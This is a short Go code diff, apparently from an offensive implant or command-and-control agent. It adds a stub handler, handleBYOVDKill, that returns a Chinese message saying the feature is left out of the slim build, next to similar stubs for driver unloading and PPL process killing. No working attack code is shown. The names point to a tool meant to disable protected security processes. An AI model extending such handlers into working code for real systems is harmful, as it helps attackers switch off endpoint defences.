@@ -104,6 +104,10 @@ func handleBYOVDUnload(taskData string) (string, int32, string) {
 	return "", -1, "BYOVD 未包含在精简构建中"
 }
 
+func handleBYOVDKill(taskData string) (string, int32, string) {
+	return "", -1, "BYOVD 未包含在精简构建中"
+}
+
 func handlePPLKill(taskData string) (string, int32, string) {
 	return "", -1, "PPL 击杀未包含在精简构建中"
 }
